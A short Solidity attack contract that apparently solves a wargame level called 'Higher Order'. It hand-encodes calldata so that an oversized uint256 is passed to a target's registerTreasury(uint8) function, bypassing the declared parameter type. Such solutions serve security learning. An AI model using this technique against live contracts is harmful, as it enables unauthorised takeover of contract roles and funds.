pragma solidity 0.6.12;

interface HigherOrderInterface {
    function registerTreasury(uint8) external;
}

contract CorrectAttack {
    HigherOrderInterface public higherOrder;

    constructor(address _target) public {
        higherOrder = HigherOrderInterface(_target);
    }

    function exploit(uint256 num) public {
        bytes4 selector = bytes4(keccak256("registerTreasury(uint8)"));
        bytes memory data = abi.encodePacked(selector, num);
        (bool success, ) = address(higherOrder).call(data);
        require(success, "Failed to call registerTreasury");
    }
}
